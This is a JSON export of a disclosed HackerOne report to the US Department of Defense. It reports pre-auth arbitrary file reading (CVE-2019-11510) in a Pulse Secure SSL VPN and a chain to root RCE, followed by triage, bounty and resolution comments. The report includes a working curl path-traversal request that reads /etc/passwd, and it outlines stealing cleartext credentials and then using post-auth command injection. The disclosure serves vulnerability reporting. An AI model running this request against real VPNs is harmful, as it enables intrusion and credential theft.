{"id":695005,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTUwMDU=","url":"https://hackerone.com/reports/695005","title":"Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://████","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-09-14T22:51:23.490Z","submitted_at":"2019-09-14T22:51:23.490Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sp1d3rs","url":"/sp1d3rs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-11510","CVE-2019-11542","CVE-2019-11539","CVE-2019-11538","CVE-2019-11508","CVE-2019-11540"],"singular_disclosure_disabled":true,"disclosed_at":"2021-07-29T19:49:31.429Z","bug_reporter_agreed_on_going_public_at":"2021-07-27T08:04:05.260Z","team_member_agreed_on_going_public_at":"2021-07-29T19:49:31.297Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"##Description\nHello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:\n**CVE-2019-11510 - Pre-auth Arbitrary File Reading**\nCVE-2019-11542 - Post-auth Stack Buffer Overflow\n**CVE-2019-11539 - Post-auth Command Injection**\nCVE-2019-11538 - Post-auth Arbitrary File Reading\n**CVE-2019-11508 - Post-auth Arbitrary File Writing**\nCVE-2019-11540 - Post-auth Session Hijacking\n\nLink to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf\n\nI discovered that `https://██████████` instance is vulnerable to described vulnerabilities.\n\n##POC\n\nReading `/etc/passwd` via CVE-2019-11510:\n```\ncurl -i -k --path-as-is https://██████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/\n```\n```\n███████\n█████████\n██████████\n████\n█████\n██████\n███████\n████████\n███████\n```\n\nThe RCE can be achieved with this chain:\n1) Pulse Secure stores credentials in the cleartext.\n2) Attacker reads credentials  and authorizes on VPN\n3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.\n\n##Suggested fix\nUpdate the Pulse Secure SSL VPN software.\n\n## Impact\n\nRemote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.\nYou can see here example report to Twitter by Orange Tsai: https://hackerone.com/reports/591295","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":126,"name":"File and Directory Information Exposure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":34,"voters":["dninjadave","obsesif","tolga","drsniper","sklnhunt","jarij","yassinek3ch","zayn1337","realtess","splint3rsec","and 24 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5809859,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Screenshot included:\n█████\n\nIn case you will face with timeout errors (common thing when testing DoD resources), try to change your IP/VPN","automated_response":false,"created_at":"2019-09-15T12:23:03.026Z","updated_at":"2021-07-29T18:46:12.664Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5810593,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sp1d3rs,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@bassguitar ","automated_response":false,"created_at":"2019-09-15T16:27:43.804Z","updated_at":"2019-09-15T16:27:43.804Z","actor":{"username":"bassguitar","cleared":false,"url":"/bassguitar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/352/794/5d82b321348f78aa4ac9c82c0bdd004828bcb414_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5848376,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2019-09-20T01:10:07.361Z","updated_at":"2019-09-20T01:10:07.361Z","additional_data":{"added_weaknesses":[{"id":126,"name":"File and Directory Information Exposure"}],"removed_weaknesses":[{"id":59,"name":"OS Command Injection"}]},"actor":{"username":"orangeband","cleared":false,"url":"/orangeband","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/540/b55c564a8a6f8099d28ea9afa41d197ad0031fc3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5848405,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @sp1d3rs,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@orangeband ","automated_response":false,"created_at":"2019-09-20T01:10:21.904Z","updated_at":"2019-09-20T01:10:21.904Z","actor":{"username":"orangeband","cleared":false,"url":"/orangeband","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/540/b55c564a8a6f8099d28ea9afa41d197ad0031fc3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5857277,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hey @sp1d3rs , we have determined that this issue is eligible for a bounty, and are issuing you a $5,000 bounty for this `Critical`-severity issue.\n\nThank you once again for your report and we look forward to working with you again in the near future.","automated_response":false,"created_at":"2019-09-20T23:05:41.367Z","updated_at":"2019-09-20T23:05:41.367Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"bounty_amount":"5000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"deptofdefense","collaborator":{"username":"sp1d3rs","url":"/sp1d3rs"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6160105,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As part of my monthly reports recheck process, it's notification that this report was resolved and instance patched.","automated_response":false,"created_at":"2019-10-29T01:07:51.333Z","updated_at":"2019-10-29T01:07:51.333Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6357250,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2019-11-20T12:57:57.374Z","updated_at":"2019-11-20T12:57:57.374Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sp1d3rs","url":"/sp1d3rs"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12689332,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-07-27T08:04:05.301Z","updated_at":"2021-07-27T08:04:05.301Z","first_to_agree":true,"actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12741431,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at VDP-Questions@dc3.mil if there are any questions, concerns or issues.","automated_response":false,"created_at":"2021-07-29T19:49:31.324Z","updated_at":"2021-07-29T19:49:31.324Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12741432,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-07-29T19:49:31.482Z","updated_at":"2021-07-29T19:49:31.482Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12741433,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","automated_response":false,"created_at":"2021-07-29T19:49:38.966Z","updated_at":"2021-07-29T19:49:38.966Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}